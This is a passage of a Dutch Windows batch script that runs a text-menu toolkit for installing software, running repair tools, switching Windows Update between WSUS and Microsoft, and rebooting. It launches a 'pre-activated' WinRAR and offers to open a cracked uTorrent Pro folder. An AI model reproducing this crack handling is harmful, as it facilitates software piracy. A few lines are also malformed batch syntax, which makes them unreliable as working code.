echo ::      8. Windows 10 Tool           ( Computer Upgraden )   ::
echo ::      9. GWX Control   ( win10 notificatie verwijderen )   ::
echo ::                                                           ::
echo ::      Terug(Z)                                             ::
echo ::      Afsluiten(X)                                         ::
echo ::                                                           ::
echo ::                                                           ::
echo :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo.
set /p choice=Keuze : 
if /i "%choice%"=="1" goto :hirensboot
if /i "%choice%"=="2" goto :adwcleaner
if /i "%choice%"=="3" goto :SLASHBLADE2
if /i "%choice%"=="4" goto :RecoverDATA
if /i "%choice%"=="5" goto :REGFIX
if /i "%choice%"=="6" goto :DTEMP
if /i "%choice%"=="7" goto :WSUServer
if /i "%choice%"=="8" goto :windows10bit
if /i "%choice%"=="9" goto :win10gwx
if /i "%choice%"=="z" goto :Overig
if /i "%choice%"=="x" exit
if not "%choice%"=="" ECHO "%choice%" Is niet een geldige optie
Pause
goto :TOOLZMENU
:adblock
cls
if "%internet%"=="Not connected to internet" (goto :ADBLOCKNOCONNECTION) else (goto :ADBLOCKACTIVE)
:ADBLOCKNOCONNECTION
cls
echo sorry, u heeft geen internet verbinding. :(
pause
goto :Installerz
:ADBLOCKACTIVE
cls
echo Er Bestaan twee soorten adblock. 
Echo (A) Adblock ( voor safarie en chrome )
echo (B) Adblock Plus ( voor de andere browsers )
echo.
SET /P ANSWER=Wilt u Adblock(A) of Adblock Plus(B) installeren ?  
echo You chose: %ANSWER% 
if /i "%ANSWER%"=="A" (start "Chrome" chrome --new-window https://getadblock.com/) 
if /i "%ANSWER%"=="B" (Start https://adblockplus.org/nl)
if /i "%ANSWER%"=="Z" goto :Installerz
goto :Installerz
:winrar1
cls
IF "%bit%"=="x86" (Start /d "..\WinRAR 5.01 Final Pre-Activated\" wrar501.exe) else (Start /d "..\WinRAR 5.01 Final Pre-Activated\" winrar-x64-501.exe)
goto :Installerz
:pcidatabaseWhat
cls
SET /P ANSWER=Wilt u Zoeken op Device(D) of Vendor(V) Nummer (D/V)?  
echo You chose: %ANSWER% 
if /i "%ANSWER%"=="d" (goto :pcidatabasedev) 
if /i "%ANSWER%"=="v" (goto :pcidatabaseven)
if /i "%ANSWER%"=="Z" goto :drivermenuACTIVE
goto :pcidatabaseWhat
:pcidatabasedev
cls
echo          Zoek het onbekende apparaat op. klik op details.
echo Zoek het hardware id en typ het 4 cijferige nummer hieronder in.
Start devmgmt.msc
echo.
set /p SC= DEV Nummer : 
start "" /b "iexplore.exe" http://www.pcidatabase.com/search.php?device_search_str=%SC% 
goto :drivermenuACTIVE
:pcidatabaseven
cls
echo          Zoek het onbekende apparaat op. klik op details.
echo Zoek het hardware id en typ het 4 cijferige nummer hieronder in.
Start devmgmt.msc
echo.
set /p SC= VEN Nummer : 
start "" /b "iexplore.exe" http://www.pcidatabase.com/search.php?vendor_search_str=%SC%
goto :drivermenuACTIVE
:WLE
cls
start /d "..\Windows Live\" WindowsLive.exe
goto :Installerz
:Utorrentsetup
cls
start /d "..\uTorrent Pro v3.4.2\" uTorrent.exe
echo Er is een Crack aanwezig. map nu openen (J/N)?
SET /P ANSWER=Keuze : 
if /i "%ANSWER%"=="j" (goto :utorrentcrack) 
if /i "%ANSWER%"=="n" (goto :Installerz) 
goto :Utorrentsetup
:utorrentcrack
cls
%SystemRoot%\explorer.exe "..\uTorrent Pro v3.4.2\Crack\"
goto :installerz
:RecoverDATA
cls
echo Gebruikt u een FAT(F) of NTFS(N) filesystem ? 
echo.
set /P ANSWER=Keuze : 
echo keuze : 
if /i "%ANSWER%"=="f" (start /d "..\ExPeRiMeNtAl\Toolz\Recover\FAT\" GetDataBackforFATPortable.exe)
if /i "%ANSWER%"=="N" (start /d "..\ExPeRiMeNtAl\Toolz\Recover\NTFS\" GetDataBackforNTFSPortable.exe)
goto :toolzmenu
:REGFIX
cls
%SystemRoot%\explorer.exe "..\ExPeRiMeNtAl\Toolz\Recover\REG FIX"
goto :toolzmenu
:Dtemp
cls
DEL "%TEMP%"
goto :TOOLZMENU
:hirensboot
cls
set HBCDPath="%~dp0"
if %HBCDPath:~2,1%#==/# set WAIT=/WAIT
pushd "%~dp0"
if not defined APPDATA set APPDATA=%USERPROFILE%\AppData\Roaming
set CHKSYS=%SystemRoot%\System32
if exist %SystemRoot%\SysWOW64 set CHKSYS=%SystemRoot%\SysWOW64
if not exist %CHKSYS%\msvbvm60.dll HBCD\Programs\7z.exe x -aos -o%CHKSYS% HBCD\Programs\Files\DLL.7z msvbvm60.dll&%CHKSYS%\regsvr32 /s %CHKSYS%\msvbvm60.dll
echo.%WAIT%
start "" %WAIT% HBCD\HBCDMenu.exe
popd
goto :TOOLZMENU
:adwcleaner
cls
start /d "..\ExPeRiMeNtAl\Toolz\Programs\" adwcleaner_5.026.exe
goto :TOOLZMENU
:Tweak
cls
if "%windows%"=="Server 2012 R2 or Windows 8.1" (goto :win8)
if "%windows%"=="Windows 8" (goto:win8)
if "%windows%"=="Win7 or server 2008 R2" (goto :win7)
else goto :NOTWEAK
:notweak
echo geen tweaks voor jouwn os gevonden :(
pause
goto :Tweak
:win7
cls
SET /P ANSWER=Tweak Boot(B) of Login(L) scherm (B/L)?  
echo You chose: %ANSWER% 
if /i "%ANSWER%"=="B" (goto :BOOTLOGON) 
if /i "%ANSWER%"=="L" (goto :TWEAKLOGON)
if /i "%ANSWER%"=="Z" goto :tweak
goto :win7
:BOOTLOGON
cls
Start /d "..\Tweak\Windows 7\" Win7BootUpdater.exe
goto :Installerz
:TWEAKLOGON
cls
Start /d "..\Tweak\Windows 7\" TweaksLogon.exe
goto :Installerz
:win8
cls
SET /P ANSWER=Tweak Windows Tegels(T) of verander de Achtergrond van de Tegels(A) (T/A)?  
echo You chose: %ANSWER% 
if /i "%ANSWER%"=="T" (goto :oblytile) 
if /i "%ANSWER%"=="A" (goto :SCREENCOZ)
if /i "%ANSWER%"=="Z" goto :Installerz
goto :win8
:oblytile
cls
start /d "..\Tweak\Windows 8\" OblyTile.exe
goto :Installerz
:SCREENCOZ
cls
start /d "..\Tweak\Windows 8\" Windows 8 Start Screen Customizer.exe
goto :Installerz
:WSUServer
cls
SET /P ANSWER=Update van WSUS(W) instellen/Update terugzetten naar Microsoft(M) (W/M)?  
echo You chose: %ANSWER% 
if /i "%ANSWER%"=="W" (goto :WSUSADD) 
if /i "%ANSWER%"=="M" (goto :WSUSDEL)
if /i "%ANSWER%"=="z" (goto :TOOLZMENU)
goto :WSUServer
:WSUSADD
Echo WAARSCHUWING UPDATE SERVER WORD VERANDERD NAAR HTTP://WSUSERVER/
pause
Start /d "..\Update Server\" WSUServer.reg
Echo ! SYSTEEM MOET OPNIEUW WORDEN GESTART !
pause
Shutdown -r -t 10 -c "SYSTEEM START OPNIEUW OP UPDATES TE HALEN VAN WSUS"
goto :TOOLZMENU
:WSUSDEL
cls
Echo UPDATE SERVER WORDT HERSTELT NAAR MICROSOFT ! ADMINISTRATOR RECHTEN VEREIST !
ECHO VOER SETUP UIT ALS ADMIN ANDERS IS ER EEN MOGENLIJKHEID DAT HET NIET LUKT!
pause
REG DELETE HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate /f
Echo ! SYSTEEM MOET OPNIEUW WORDEN GESTART !
pause
Shutdown -r -t 10 -c "SYSTEEM START OPNIEUW OP OM UPDATE SERVER TE HERSTELLEN"
goto :TOOLZMENU
:windows10bit
cls
IF "%bit%"=="x86" (goto :w10tool32) else (goto :w10tool64)
goto :TOOLZMENU
:w10tool32
cls
Start /d "..\windows 10 upgrade\" mediaCreationTool.exe
goto :TOOLZMENU
:w10tool64
cls
Start /d "..\windows 10 upgrade\" MediaCreationToolx64.exe
goto :TOOLZMENU
:win10gwx
cls
start /d "..\gwx control\" GWX_control_panel.exe
goto :TOOLZMENU
:ninite1
cls
if "%internet%"=="Not connected to internet" (goto :niniteDOWN) else (goto :niniteACTIVE)
:niniteDOWN
cls
echo sorry, u heeft geen internet verbinding. :(
pause
goto :Overig
:niniteACTIVE
cls
echo.
echo / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ 
echo \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ /
echo / \                                                             / \
echo \ /                       NINITE MENU                           \ /
echo / \                                                             / \
echo \ /     1. Install Runtime                                      \ /
echo / \     2. Install K-lite Codecs                                / \
echo \ /     3. Install Google Chrome                                \ /
echo / \     4. Install ImgBurn                                      / \
echo \ /     5. Install WinRAR                                       \ /
echo / \     6. Install Reader                                       / \
echo \ /     7. Install eigen pakket (/ninite/pakket.exe)           \ /
echo / \                                                             / \
echo \ /                                                             \ /
echo / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \
echo \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ /
echo.
set /p choice=Keuze : 
if /i "%choice%"=="1" goto :runtime
if /i "%choice%"=="2" goto :Codecs
if /i "%choice%"=="3" goto :GoogleChrome
if /i "%choice%"=="4" goto :ImgBurn
if /i "%choice%"=="5" goto :Winrar
if /i "%choice%"=="6" goto :Reader
if /i "%choice%"=="7" goto :mypacket
if /i "%choice%"=="z" goto :overig
if /i "%choice%"=="x" exit
if not "%choice%"=="" ECHO "%choice%" Is niet een geldige optie
pause
goto :Ninite1
:Runtime
cls
Start /d "..\Ninite\" Runtime.exe
goto :ninite1
:Codecs
cls
start /d "..\Ninite\" Codecs.exe
goto :ninite1
:GoogleChrome
cls
start /d "..\Ninite\" GoogleChrome.exe
goto :ninite1
:ImgBurn
cls
start /d "..\Ninite\" ImgBurn.exe
goto :ninite1
:Winrar
cls
start /d "..\Ninite\" Installrar.exe
goto :ninite1
:Reader
cls
start /d "..\Ninite\" Reader.exe
goto :ninite1
:mypacket
cls
start /d "..\Ninite\" pakket.exe
goto :ninite1
:Realexit
exit
//END OF LINE BITCHAS
// Made By EricTheDreamer www.facebook.nl/ericthedreamer